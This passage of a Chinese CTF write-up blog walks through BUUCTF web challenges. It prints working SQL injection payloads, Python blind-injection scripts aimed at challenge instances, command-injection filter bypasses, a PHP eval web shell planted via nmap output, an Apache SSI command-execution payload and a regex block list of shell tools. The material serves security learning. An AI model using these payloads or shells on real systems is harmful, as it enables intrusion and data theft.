的意思是建立一个临时列，这个列的列名为1，所有初始值都被设为1。</p><p>解法2：</p><p>通过修改SQL配置将或运算符||设置为连接符</p><pre><code>payload 1;set sql_mode=pipes_as_concat;select 1</code></pre><p>要注意分号隔断了前面的命令，所以要再次添加select!!</p><p>上面的payload等同于</p><pre><code>select concat(1,flag) from Flag</code></pre><h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>测出来username有注入点，用单引号闭合。</p><p>测数据库名</p><pre><code>username=-1&#39; union select 1,2,database()-- -&amp;password=admin//库名为geek</code></pre><p>测表名：</p><pre><code>username=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39; -- -&amp;password=admin//表名为geekuser,l0ve1ysq1</code></pre><p>两个表里面都有id,uername,password</p><p>最终在l0ve1ysq1表里找到了flag</p><pre><code>username=-1&#39; union select 1,2,(select group_concat(concat_ws(0x7e,username,password)) from l0ve1ysq1)-- -&amp;password=admin</code></pre><h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p>测出来也是单引号闭合，但用order by 3测试时发现报错时”der 3”，说明or和by被过滤，使用双拼即可绕过，这道题几乎所有关键字都可以用双拼绕过，先查库名：</p><pre><code>?username=-1&#39; uunionnion seselectlect 1,2,database()-- -&amp;password=admin//geek</code></pre><p>再查表明：</p><pre><code>?username=-1&#39; ununionion seselectlect 1,2,group_concat(table_name) ffromrom infoorrmation_schema.tables whwhereere table_schema=&#39;geek&#39; -- -&amp;password=admin//b4bsql,geekuser</code></pre><p>再查字段：</p><pre><code>username=-1&#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39; -- -&amp;password=admin//id,username,password</code></pre><p>最终在b4bsql表里找到了flag</p><pre><code>?username=-1&#39; ununionion seselectlect 1,2,group_concat(concat_ws(0x7e,username,passwoorrd)) frfromom b4bsql -- -&amp;password=admin</code></pre><h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>搞了一圈发现连()都过滤了，看别人wp才发现源码有个注释：</p><pre><code>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5base32解码：c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==base64解码：select * from user where username = &#39;$name&#39;</code></pre><pre><code>Base64和Base32 区别：base64中包含大写字母（A-Z），小写字母（a-z），数字0—9以及+/；base32中只包含大写字母（A-Z）和数字234567</code></pre><p>同时，这一关利用sqli的特性：<strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。</strong></p><p>所以，如果我们使用联合查询访问，一个真实存在的用户名和一个我们自己编造的密码，就会使虚拟数据混淆admin密码，从而使我们成功登录，得到 flag</p><p>我们这题可以测出有三个列，按照报错回显，可以确定第二个列是username,第三个列是password，那么第一列应该是id，我们尝试构造出：</p><pre><code>name=1&#39; union select 1,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&#39;#&amp;pw=1</code></pre><p>如果你看过这题的源代码就会发现，密码是要于数据库中被md5加密过的密码进行对比的，所以我们第三列的字符串是1的md5值。</p><h3 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h3><p>测试了一下union,空格都被过滤了，试试报错注入，空格用括号代替：</p><pre><code>?username=-1&#39;or(updatexml(1,concat(0x7e,database()),1))%23&amp;password=adminusername=admin&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23&amp;password=admin//geek</code></pre><p>测表名，等号也被过滤了，用like代替</p><pre><code>?username=admin&#39;^updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like&#39;geek&#39;)),1)%23&amp;password=admin//H4rDsq1</code></pre><p>测字段</p><pre><code>?username=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like&#39;H4rDsq1&#39;)),1)%23&amp;password=admin//id,username,password</code></pre><p>爆数据</p><pre><code>?username=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(concat_ws(0x7e,username,password)))from(H4rDsq1))),1)%23&amp;password=admin//~flag~flag&#123;53f3bd9d-f44f-4ce5-a0</code></pre><p>可以看到，只出来了左半部分，使用right()：</p><pre><code>?username=admin&#39;^updatexml(1,concat(0x7e,(select(right(group_concat(concat_ws(0x7e,username,password)),20))from(H4rDsq1))),1)%23&amp;password=admin//~5-a0c8-2720a6d31213&#125;</code></pre><h3 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h3><p>用order by 测出有两列数据，继续union select 1,2时发现爆出了过滤的字符：</p><img src="/2023/08/03/buuctf/155441.png" class=""><p>用extractvalue也只能注出库名</p><p>试试堆叠注入，测库名：</p><pre><code>inject=1&#39;;show databases;</code></pre><img src="/2023/08/03/buuctf/161321.png" class=""><p>测表名：</p><pre><code>?inject=1&#39;;show tables;</code></pre><img src="/2023/08/03/buuctf/161643.png" class=""><p>测字段，如果tableName是纯数字，需要用&#96;包裹：</p><pre><code>?inject=1&#39;;show columns from `1919810931114514`;</code></pre><img src="/2023/08/03/buuctf/170603.png" class=""><p>然后就无能为力，看看大佬wp</p><p><strong>解法一：</strong></p><p>可以看到words表里有两个属性，即两列：id 和data<br>而1919810931114514表里只有一个属性列<br>说明输入框可能查询的就是words表<br>后台sql语句可能为</p><pre><code>select id,data from words where id=</code></pre><p>接下来就是如何获取flag了，思路是把1919810931114514表改名为words表，把属性名flag改为id，然后用1’ or 1&#x3D;1;# 显示flag出来，在这之前当然要先把words表改名为其他</p><pre><code>1&#39;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(100);#</code></pre><p><strong>解法二：</strong></p><p> 因为select关键字被过滤了，所以我们可以通过预编译的方式拼接select 关键字：</p><pre><code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from `1919810931114514` &#39;);EXECUTE hacker;#</code></pre><p>关于预编译，可以参考：<a href="https://www.cnblogs.com/geaozhang/p/9891338.html">https://www.cnblogs.com/geaozhang/p/9891338.html</a></p><p><strong>解法三</strong>：</p><p>还是预编译，不过我们可以将sql语句直接进行16进制编码</p><pre><code>1&#39;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#</code></pre><p>注：prepare…from…是预处理语句，会进行编码转换。</p><p>​    SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。</p><p><strong>解法四：</strong></p><p>此题还可以通过handle直接出答案：</p><pre><code>1&#39;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</code></pre><pre><code class="text">打开表：HANDLER 表名 OPEN ;查看数据：HANDLER 表名 READ next;关闭表：HANDLER 表名 READ CLOSE;</code></pre><p>可以参考 <a href="https://blog.csdn.net/qq_43427482/article/details/109898934">https://blog.csdn.net/qq_43427482/article/details/109898934</a></p><h3 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h3><p>屏蔽了alter和prepare。还可以使用上一道题的第三种方法。</p><h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>这道题输入1和2会输出不同的话，输入其他数字会显示Error Occured When Fetch Result.</p><p>尝试报错注入发现只显示bool(false)，所以我们试试盲注，这道题过滤了空格，用括号可以代替：</p><pre><code>id=if(1=1,1,2)//Hello, glzjin wants a girlfriend.id=if(1=2,1,2)//Do you want to be my girlfriend?</code></pre><p>发现可以用布尔盲注，题目提示了flag在flag表里的flag字段里，直接爆数据：</p><pre><code>id=if(ascii(substr((select(flag)from(flag)),1,1))&gt;1,1,2)</code></pre><p>脚本：</p><pre><code>import requestsif __name__ == &#39;__main__&#39; :    url = &#39;http://bb5603db-211d-4c37-9796-e7a42349e7c8.node4.buuoj.cn:81/index.php&#39;    result = &#39;&#39;    i = 0    while True:        i = i + 1        low = 32        high = 127        while low &lt; high:            mid = (low + high) // 2            payload = f&#39;if(ascii(substr((select(flag)from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)&#39;            data = &#123;                &quot;id&quot;:payload            &#125;            r = requests.post(url=url,data=data)            if &#39;Hello&#39; in r.text:                low = mid + 1            else:                high = mid        if low != 32:            result += chr(low)        else:            break        print(result)</code></pre><h3 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h3><p>这道题很坑，在登录框里瞎注了半天，没有头绪，最后看别人wp才知道注入点在那几个按妞的地方</p><p>分别点击那几个按钮你就会发现url里的id会变，这就是注入点，get型注入，而且这道题是数字型注入</p><p>测试了一下发现过滤了空格，#，and，order by，union啥的，所以我们试试用括号和异或来进行代替</p><pre><code>?id=0^(ascii(substr((select(database())),1,1))&gt;2)</code></pre><img src="/2023/08/03/buuctf/172434.png" class=""><p>可以看到返回结果与id&#x3D;1一样，可以成功绕过，基于此，我们可以用脚本进行注入：</p><pre><code class="python">import requestsimport timeif __name__ == &#39;__main__&#39; :    url = &#39;http://cf3b0295-5066-4352-aa2b-51ccb07a38c5.node4.buuoj.cn:81/search.php?id=0^&#39;    result = &#39;&#39;    i = 0    while True:        i = i + 1        low = 32        high = 130        while low &lt; high:            mid = (low + high) // 2            #爆库名            #payload = f&#39;(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;            #爆表名                #payload=f&#39;(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&quot;geek&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;            #爆字段            #payload = f&#39;(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=&quot;geek&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;            #爆数据           #payload=f&#39;(ascii(substr((select(group_concat(concat_ws(&quot;~&quot;,username,password)))from(F1naI1y)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;                     r = requests.get(url=url+payload)            time.sleep(0.05)            if &#39;others&#39; in r.text:                low = mid + 1            else:                high = mid        if low!=32:            result += chr(low)        else:            break        print(result) </code></pre><p>这里要注意的是time.sleep()，请求过快可能不能响应，需要加点延时。</p><h3 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h3><p>打开后是一个输入框，但输入什么都没反应，用burp抓包：</p><img src="/2023/08/03/buuctf/201609.png" class=""><p>这里面password就是我们用户框中输入得东西。如果通过md5($pass,True)之后返回字符串是’or ‘1的话，形成一个永真条件:select * from ‘admin’ where password&#x3D;’ ‘or ‘6…’</p><p>问题是这里的md5加上参数True后返回的是原始16字符2进制格式</p><p>我们可以通过这个脚本来获得满足我们要求的明文：</p><pre><code>&lt;?php for ($i = 0;;) &#123;  for ($c = 0; $c &lt; 1000000; $c++, $i++)  if (stripos(md5($i, true), &#39;\&#39;or\&#39;&#39;) !== false)   echo &quot;\nmd5($i) = &quot; . md5($i, true) . &quot;\n&quot;; echo &quot;.&quot;;&#125;?&gt;</code></pre><p>这里我们用网上常用的<strong>ffifdyop</strong>，这个字符串经过md5($pass,True)后就是<code>&#39;or &#39;6...</code></p><p>传上去后页面跳转到levels91.php，查看源代码：</p><img src="/2023/08/03/buuctf/205543.png" class=""><p>弱类型比较，第一种方法是找出md5值都是两个0e开头的开头的。原理是php里面在做 &#x3D;&#x3D; 的时候会先把两边的类型转成一样的，因为是0e开头，php会认为它是科学技计数法，而0的多少次方都是0。这样的字符网上有很多</p><pre><code>s878926199as155964671a240610708UYXFLOI</code></pre><p>第二种方法是用数组绕过：</p><pre><code>?a[]=1&amp;b[]=2</code></pre><p>传参后又跳转到levell14.php</p><img src="/2023/08/03/buuctf/210632.png" class=""><p>这里是强类型比较，就只能用数组绕过（&#x3D;&#x3D;&#x3D;要求值和类型都相同，貌似当类型为string时，还要比较字符串是否一摸一样）</p><pre><code>param1[]=1&amp;param2[]=2</code></pre><h1 id="命令执行-rce"><a href="#命令执行-rce" class="headerlink" title="命令执行(rce)"></a>命令执行(rce)</h1><h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><p>先测目录，发现在根目录有flag文件</p><pre><code>target=127.0.0.1;ls ../../../</code></pre><img src="/2023/08/03/buuctf/101305.png" class=""><p>查看文件，爆出flag</p><pre><code>target=127.0.0.1;cat ../../../flag</code></pre><h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>进去有个提示&#x2F;?ip，get一下发现和前面一道题差不多</p><p>命令联合执行：</p><pre><code>;     前面的执行完执行后面的|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         ||    当前面的执行出错时（为假）执行后面的&amp;     将任务置于后台执行&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真%0a  （换行）%0d  （回车）</code></pre><p>通配符：</p><pre><code>*#匹配全部字符，通配符?#任意一个字符，通配符[]#表示一个范围（正则，通配符）&#123;&#125;#产生一个序列（通配符）</code></pre><p>ls就发现了flag.php和index.php，但测试了一下很多东西都被过滤了，空格只能用$IFS$1绕过，flag也被ban了，我们来尝试一下index.php:</p><img src="/2023/08/03/buuctf/103747.png" class=""><pre><code>总结过滤的特殊字符&amp; / ？ * &lt; x&#123;00&#125;-\x&#123;1f&#125; &#39; &quot; \ () [] &#123;&#125;  空格&quot;xxxfxxxlxxxaxxxgxxx&quot; &quot; &quot; &quot;bash&quot; </code></pre><p>1、变量替换</p><pre><code>?ip=127.0.0.1;b=g;cat$IFS$1fla$b.php//这里的变量替换顺序要注意，不然又被贪婪匹配ban了</code></pre><p>2、变量ab互换传递，绕过字符串匹配，实现拼接</p><pre><code>?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php</code></pre><p>3、内联执行</p><pre><code>?ip=127.0.0.1;cat$IFS`ls`?ip=127.0.0.1;cat$IFS$3`ls`</code></pre><p>4、被过滤的bash，用管道+sh替换</p><pre><code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh  //cat flag.php用base64加密来绕过正则匹配?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash //bash被ban了</code></pre><h3 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h3><p>这道题只有一个eval($_POST[“Syc”]);，可以直接用蚁剑连接</p><h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p>这道题目在一开始就是一个空白的单纯页面，但是你经过目录扫描的话就会发现一个.git文件</p><p>{ % asset_img 224106.png%}</p><p>这里是git源码泄露，可以用githack把他搞出来</p><p>得到一个index.php</p><img src="/2023/08/03/buuctf/224448.png" class=""><p>可以看到，第一层正则过滤了伪协议，第二层正则是一直递归，也就是所谓的无参数函数校验，例如它可以匹配到a(b(c()d()))，紧接着 又是一次黑名单过滤，很多的关键字都被ban掉了</p><p>所以这题不能用伪协议，只能用无参数函数形式，且过滤了很多函数</p><p>我们第一步肯定是想知道当前目录之下都有些什么<br>所以要构建如下语句</p><pre><code>&lt;?phpprint_r(scandir(&#39;.&#39;));?&gt;</code></pre><p>但是，它只能允许无参数函数，所以我们就要想办法利用无参数函数将“.”给构造出来。</p><p>payload</p><pre><code>print_r(scandir(current(localeconv())));或highlight_file(next(scandir(pos(localeconv()))));</code></pre><pre><code>localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是&quot;.&quot;。pos()或current()函数 输出数组中的当前元素的值。</code></pre><p>可以看到，flag在当前目录下，读flag文件：</p><pre><code>print_r(show_source(array_rand(array_flip(scandir(current(localeconv()))))));//array_flip()又可以将数组中的键和值进行对换//array_rand()函数可以随机读取一个数组键或highlight_file(next(array_reverse(scandir(pos(localeconv())))));//array_reverse() 函数以相反的元素顺序返回数组//next() 输出数组中的当前元素的下一个元素的值</code></pre><h3 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h3><p>打开后显示一个hackme和Cannot modify header information - headers already sent by ……</p><p>抓包也没找到有用的信息，但是可以用dirsearch扫出robots,txt:</p><img src="/2023/08/03/buuctf/192357.png" class=""><p>进入到fAke_f1agggg.php也没找到啥有用的，抓包：</p><img src="/2023/08/03/buuctf/192548.png" class=""><p>发现一个fl4g.php，进入</p><img src="/2023/08/03/buuctf/192742.png" class=""><p>可以改一下编码</p><p>有三层绕过</p><p>1、intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021</p><p>这里可以用字符串的整型转换，虽然intval函数可以自动判别0x、0b等等的前缀，但不要忘了我们这里传进去的其实字符串，所以会产生从字符串到数字的转换</p><pre><code>payload ?num=0xABC或num=700e5</code></pre><p>2、$md5&#x3D;$_GET[‘md5’]</p><p>md5弱类型比较</p><pre><code>payload: md5=0e215962017</code></pre><p>3、屏蔽了空格和cat</p><pre><code>payload: get_flag=tac%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></pre><h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><p>进去之后，发现url里有个img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0，看起来像base64，先解码一下</p><p>MzUzNTM1MmU3MDZlNjc&#x3D;</p><p>再解码一次</p><p>3535352e706e67</p><p>再16进制转字符串</p><p>555.png（这个应该是首页中图片的名称，可能存在文件包含）</p><p>查看源代码，发现有一堆base64编码的字符，试一下base64转图片：</p><img src="/2023/08/03/buuctf/225252.png" class=""><p>就是首页的图片</p><p>试试包含一下index.php</p><p>对index.php先转16进制再进行两次base64编码：</p><p>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</p><p>查看源代码然后base64解码：</p><pre><code>&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#39;content-type:text/html;charset=utf-8&#39;);$cmd = $_GET[&#39;cmd&#39;];if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;]))     header(&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;);$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) &#123;    echo &#39;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#39;;    die(&quot;xixi～ no flag&quot;);&#125; else &#123;    $txt = base64_encode(file_get_contents($file));    echo &quot;&lt;img src=&#39;data:image/gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;/img&gt;&quot;;    echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;    echo(&quot;forbid ~&quot;);    echo &quot;&lt;br&gt;&quot;;&#125; else &#123;    if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) &#123;        echo `$cmd`;    &#125; else &#123;        echo (&quot;md5 is funny ~&quot;);    &#125;&#125;?&gt;&lt;html&gt;&lt;style&gt;  body&#123;   background:url(./bj.png)  no-repeat center center;   background-size:cover;   background-attachment:fixed;   background-color:#CCCCCC;&#125;&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>审计代码，发现这里用来强制转化（（String）强制转换，数组被强制转换的结果都为<code>string(5) &quot;Array&quot;</code>），所以要用到强类型绕过</p><p>payload:</p><pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><p>进行url解码后的MD5值相等</p><p>收录一些md5值相等的字符串：</p><pre><code>$Param1=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;$Param2=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;$data1=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70&quot;$data2=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70&quot;</code></pre><p>然后用dir读取目录</p><p>最后用c\at%20flag读取flag（题目虽然用了正则**<code>|\\|\\\\</code>**，但这里这样写造成了反斜杠逃逸）</p><p>这里补充一个md5的知识点</p><h5 id="a-x3D-x3D-md5-a）"><a href="#a-x3D-x3D-md5-a）" class="headerlink" title="$a&#x3D;&#x3D;md5($a）"></a>$a&#x3D;&#x3D;md5($a）</h5><p><code>0e215962017</code> 的 MD5 值是由 <strong>0e</strong> 开头，在 PHP 弱类型比较中相等</p><h3 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h3><p>这道题之前做过类似的，考察的是nmap的使用</p><p>先测试127.0.0.1 | ls，发现<code>|</code>被转义了，继续测试了一下发现&amp;、;也都被转义了，所以估计代码里使用了和上次那道题一样的函数<code>escapeshellarg()</code>与<code>escapeshellcmd()</code></p><p>参考：<a href="https://blog.csdn.net/weixin_44037296/article/details/110900266">https://blog.csdn.net/weixin_44037296/article/details/110900266</a></p><p>直接上payload:</p><pre><code>&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code></pre><p>但是这样会被检测出来，测试了一下发现是过滤了php</p><pre><code>&#39; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#39;</code></pre><p>报错Host maybe down</p><p>加上扫描的地址</p><pre><code>127.0.0.1 | &#39; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#39;</code></pre><p>然后rce即可</p><h3 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h3><p>这道题先爆破了一下好像不行，然后用dirsearch扫描出一个index.php.swp</p><pre><code>&lt;?php    ob_start();    function get_hash()&#123;        $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;        $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times        $content = uniqid().$random;        return sha1($content);     &#125;    header(&quot;Content-Type: text/html;charset=utf-8&quot;);    ***    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] != &#39;&#39; )    &#123;        $admin = &#39;6d0bc1&#39;;        if ( $admin == substr(md5($_POST[&#39;password&#39;]),0,6)) &#123;            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;/script&gt;&quot;;            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);            $text = &#39;            ***            ***            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;/h1&gt;            ***            ***&#39;;            fwrite($shtml,$text);            fclose($shtml);            ***            echo &quot;[!] Header  error ...&quot;;        &#125; else &#123;            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;/script&gt;&quot;;      &#125;else    &#123;    ***    &#125;    ***?&gt;</code></pre><p>看起来这么长，其实只需要先传一个pasword，然后让substr(md5($_POST[‘password’]),0,6)&#x3D;&#x3D;‘6d0bc1’就行了</p><pre><code>import hashlibfor i in range(100000000):    a = hashlib.md5(str(i).encode(&quot;utf-8&quot;)).hexdigest()    if a[0:6] == &#39;6d0bc1&#39;:        print(i)#2305004</code></pre><p>然后输进去，我们可以获取到一个消息头：</p><img src="/2023/08/03/buuctf/234936.png" class=""><p>进这个文件：</p><img src="/2023/08/03/buuctf/235439.png" class=""><p>如何执行命令呢？这里就用到了Apache SSI 远程命令执行漏洞</p><p><a href="https://www.cnblogs.com/yuzly/p/11226439.html">https://www.cnblogs.com/yuzly/p/11226439.html</a></p><p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用&lt;!–#exec cmd&#x3D;”id” –&gt;语法执行命令。</p><p>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p><p>所以我们试一试用户名输入&lt;!–#exec cmd&#x3D;”ls ..”–&gt;</p><img src="/2023/08/03/buuctf/000253.png" class=""><p>然后读flag即可</p><h3 